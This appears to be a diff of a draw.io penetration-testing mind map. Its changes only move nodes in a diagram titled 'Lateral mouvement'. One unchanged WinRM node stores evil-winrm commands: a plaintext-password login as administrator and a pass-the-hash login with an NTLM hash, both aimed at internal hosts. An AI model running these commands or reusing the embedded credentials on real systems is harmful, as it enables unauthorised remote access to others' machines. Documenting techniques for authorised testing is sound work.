@@ -945,7 +945,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="Lateral mouvement" id="8egK0x-ltnkDFjprNt1K">
-    <mxGraphModel dx="2603" dy="793" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="2856" dy="933" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -980,7 +980,7 @@
         </mxCell>
         <object label="WinRM" clear_password="evil-winrm -u &quot;administrator&quot; -p &#39;,TsE1h73!Dk/bcs&#39; -i &quot;USBG6W10400.group.int&quot;" pth="evil-winrm -u &#39;gmendoza1!&#39; -H &#39;b2ba5fb4a699cbf08a24fc175d373fd5&#39; -i &quot;10.248.2.86&quot;" id="4FQnS6Lhucq9dQavcaFJ-5">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="830" y="1241" width="120" height="60" as="geometry" />
+            <mxGeometry x="740" y="1300" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-7" value="Authority/system" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#ffe6cc;strokeColor=#d79b00;" parent="1" vertex="1">
